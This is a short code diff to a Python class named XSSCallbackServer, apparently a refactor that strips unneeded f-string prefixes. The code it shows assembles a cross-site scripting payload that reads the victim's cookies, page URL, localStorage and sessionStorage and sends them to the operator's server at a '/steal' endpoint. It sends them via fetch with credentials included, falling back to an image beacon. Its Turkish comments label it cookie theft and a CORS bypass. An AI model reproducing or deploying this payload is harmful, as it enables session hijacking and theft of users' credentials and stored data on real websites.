@@ -205,15 +205,15 @@ class XSSCallbackServer:
         url = self.base_url
         parts = [
             # Cookie theft — her zaman dene
-            f"(function(){{",
+            "(function(){",
             f"var _t='{token}';",
-            f"var _u=encodeURIComponent(location.href);",
-            f"var _c=encodeURIComponent(document.cookie);",
+            "var _u=encodeURIComponent(location.href);",
+            "var _c=encodeURIComponent(document.cookie);",
         ]
         if include_storage:
             parts += [
-                f"var _ls=encodeURIComponent(JSON.stringify(Object.assign({{}},localStorage)));",
-                f"var _ss=encodeURIComponent(JSON.stringify(Object.assign({{}},sessionStorage)));",
+                "var _ls=encodeURIComponent(JSON.stringify(Object.assign({},localStorage)));",
+                "var _ss=encodeURIComponent(JSON.stringify(Object.assign({},sessionStorage)));",
                 f"var _src='{url}/steal?t='+_t+'&c='+_c+'&u='+_u+'&ls='+_ls+'&ss='+_ss;",
             ]
         else:
@@ -222,11 +222,11 @@ class XSSCallbackServer:
             ]
         parts += [
             # Fetch (async, CORS bypass ile)
-            f"fetch(_src,{{mode:'no-cors',credentials:'include'}}).catch(function(){{",
+            "fetch(_src,{mode:'no-cors',credentials:'include'}).catch(function(){",
             # Fetch başarısız → Image beacon fallback
-            f"new Image().src=_src;",
-            f"}});",
-            f"}})();",
+            "new Image().src=_src;",
+            "});",
+            "})();",
         ]
         return "".join(parts)
 
